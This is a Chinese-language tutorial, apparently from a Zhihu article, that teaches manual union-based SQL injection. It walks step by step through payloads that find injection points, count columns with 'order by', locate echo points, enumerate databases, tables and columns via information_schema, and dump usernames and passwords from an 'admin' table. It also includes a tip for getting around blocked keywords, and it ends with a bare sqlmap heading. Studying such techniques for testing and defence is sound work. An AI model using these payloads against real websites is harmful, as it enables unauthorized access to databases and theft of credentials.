# SQL注入原理

用户输入的内容被浏览器当做数据库语句进行执行。

## 两个关键条件

1、输入的内容一定要是数据库语句。

2、输入的内容当做数据库语句进行执行。

特点：用户输入的内容就是我们输入的内容。

## 输入位置

1.网站给我们提供的搜索框。

2.网址的参数的值。

## 总结

我们输入的【数据库语句】，如果被网站执行了，就说明这个网站存在数据库注入漏洞。

比如说，我们输入的[login],被网站执行了，带到他的数据库进行查询，并将查询的结果显示到了页面上。

## 数据库查询语法

Select ··· from ··· where ···

```text
	select 查询
	from 来自
	where 条件，当···的时候
```

## 手注流程—数据库注入漏洞

## 第一步：判断注入点

判断网站是否存在数据库注入漏洞

and 1=1 --> 页面有内容

and 1=2 --> 页面没有内容

==> 推断出这个网站存在数据库注入漏洞。

> 加 and 1=2 的目的：让前面的语句不执行，否则会影响我们后面的语句。

## 第二步：判断字段数

判断字段数（[列数](https://www.zhihu.com/search?q=列数&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra={"sourceType"%3A"article"%2C"sourceId"%3A"457972271"})），order by ，作用：排序。

> order by :用于根据指定的列对结果集进行排序。

order by 1 --> 页面有内容 --> 说明网站的表里面有1列。 order by 2 --> 页面有内容 --> 说明网站的表里面有2列。 order by 3 --> 页面没有内容 --> 说明网站的表里面没有3列，只有2列。

> ps：当使用and被拦截的时候，可以考虑使用order by 去判断网站是否存在数据库注入漏洞。
>
> ![img](https://pic2.zhimg.com/v2-d26107197f6e9e70a099399b49086c5d_b.jpg)在这里插入图片描述
>
> ![img](https://pic4.zhimg.com/v2-71be83db66bde0f9f32c1d557de3e93b_b.jpg)在这里插入图片描述

## 第三步：判断回显点

union，作用：联合查询，能够同时执行两条查询语句。

关键点：必须保证前后两条查询语句的列数保持一致。

回显点的作用：能够将我们输入的数据库语句执行，并且将结果显示到页面上。

> select * from XXXX where id =1 and 1=2 union select 1,2



![img](https://pic4.zhimg.com/v2-7176dc013ecd18c2bfd4f97545129ebf_b.jpg)在这里插入图片描述



## 第四步：查询相关内容

> database() # 函数，作用：查询当前数据库的库名 # maoshe
>
> version() # 函数，作用：查询版本号 # 5.5.53

查询数据库版本

> and 1=2 union select 1,version()

查询数据库

> and 1=2 union select 1,schema_name from information_schema.schemata limit 0,1
>
> and 1=2 union select 1,(select group_concat(schema_name) from information_schema.schemata)

查询表名

> and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 1,1
>
> and 1=2 union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database() )

查询字段名

> and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='表名' limit 0,1and 1=2 union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='admin')

查询字段内容

> and 1=2 union select 1,concat(username,',',password) from admin

查询表名：

> ?id=1 and 1=2 union select 1,table_name from information_schema.tables where table_schema=database() limit 0,1

查询字段名（列名）

> ?id=1 and 1=2 union select 1,column_name from information_schema.columns where table_schema=database() and table_name='admin' limit 0,1

查询数据

> ?id=1 and 1=2 union select 1,password from admin limit 0,1

limit m,n # 查询m+1行的n条数据。限制输出的意思。

库的名字：information_schema （系统自带的）

表的名字：[tables](https://www.zhihu.com/search?q=tables&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra={"sourceType"%3A"article"%2C"sourceId"%3A"457972271"})，columns

列的名字：table_name（存储的是表名），table_schema（存储的是库名），column_name（存储的都是列的名字）



# [sqlmap](https://www.zhihu.com/search?q=sqlmap&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra={"sourceType"%3A"article"%2C"sourceId"%3A"479697760"})